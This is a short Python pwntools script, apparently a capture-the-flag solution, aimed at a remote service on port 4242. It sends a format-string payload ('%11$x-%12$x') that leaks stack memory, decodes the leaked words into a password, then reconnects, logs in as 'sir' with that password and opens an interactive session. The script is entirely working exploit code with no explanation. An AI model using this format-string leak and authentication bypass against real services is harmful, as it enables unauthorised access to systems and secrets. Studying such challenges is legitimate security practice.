from pwn import *

context(arch = 'i386', os = 'linux')

conn = remote('bg4.spro.ink',4242)
conn.recvuntil(": ")
conn.sendline(r"%11$x-%12$x")
print conn.recvuntil(": ")
conn.sendline("asdf")
conn.recv()
data = conn.recv()
password = data.split(' ')[0].split('-')
secret = password[0].decode('hex')[::-1] + password[1].decode('hex')[::-1]
print "Using password " + secret + " to login."
conn.close()
conn = remote('bg4.spro.ink',4242)
conn.recvuntil(": ")
conn.sendline("sir")
conn.recvuntil(": ")
conn.sendline(secret)
conn.interactive()

